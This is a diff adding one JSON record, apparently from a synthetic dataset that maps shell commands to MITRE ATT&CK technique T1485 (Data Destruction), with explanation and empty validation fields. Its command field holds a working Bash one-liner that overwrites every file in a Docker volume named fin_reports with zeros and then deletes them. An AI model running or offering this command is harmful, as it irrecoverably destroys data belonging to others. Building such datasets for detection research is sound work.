@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1485",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'vol=fin_reports; mp=$(docker volume inspect -f \"{{.Mountpoint}}\" \"$vol\"); find \"$mp\" -type f -print0 | while IFS= read -r -d \"\" f; do sz=$(stat -c%s \"$f\"); dd if=/dev/zero of=\"$f\" bs=$sz count=1 conv=notrunc status=none; done; sync; find \"$mp\" -type f -delete'",
+  "explanation": "Locates a Docker volume\u2019s mountpoint, overwrites all files inside with zeros, then deletes them.",
+  "rationale_steps": [
+    "Query Docker for the volume mountpoint",
+    "Iterate all files within the volume",
+    "Overwrite each file\u2019s content with zeros",
+    "Sync changes to disk",
+    "Delete the files from the volume"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-9214ae56-0654816a",
+  "source_prompt_hash": "9214ae56",
+  "timestamp_utc": "2025-09-30T07:55:14.956261Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
